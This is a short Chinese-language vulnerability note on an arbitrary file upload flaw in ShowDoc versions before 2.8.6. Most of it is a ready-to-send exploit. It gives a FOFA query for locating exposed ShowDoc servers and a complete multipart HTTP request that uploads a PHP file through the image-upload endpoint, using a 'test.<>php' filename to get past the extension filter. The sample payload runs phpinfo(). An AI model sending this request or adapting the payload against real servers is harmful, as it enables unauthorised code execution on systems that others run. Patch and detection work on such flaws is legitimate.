#漏洞描述

ShowDoc一个非常适合IT团队的 API文档、技术文档工具,存在任意文件上传漏洞

#漏洞影响

showdoc < 2.8.6

#漏洞复现
#FOFA
```
app="ShowDoc"
```
#payload
```

POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Content-Length: 239
Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
Accept-Encoding: gzip

----------------------------835846770881083140190633
Content-Disposition: form-data; name="editormd--file"; filename="test.<>php"
Content-Type: text/plain

<?php phpinfo();?>
----------------------------835846770881083140190633--
```


  